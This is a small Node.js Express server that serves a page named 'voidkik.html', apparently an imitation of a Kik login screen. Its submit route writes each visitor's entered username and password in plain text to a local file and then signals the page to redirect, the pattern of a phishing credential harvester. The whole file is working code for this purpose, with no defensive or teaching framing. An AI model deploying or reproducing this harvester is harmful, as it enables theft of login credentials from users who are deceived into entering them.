const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

// Serve static files from the public/VoidKik directory
app.use(express.static(path.join(__dirname, 'public/VoidKik')));

// Middleware to parse POST request bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Route to serve voidkik.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/VoidKik/voidkik.html'));
});

// Route to handle form submissions
app.post('/submit', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  const data = `Username: ${username}\nPassword: ${password}\n`;

  fs.writeFile(path.join(__dirname, 'saved.txt'), data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      res.status(500).send('Internal Server Error');
    } else {
      // Respond with 200 OK to allow client-side handling of the redirect
      res.status(200).send('Success');
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
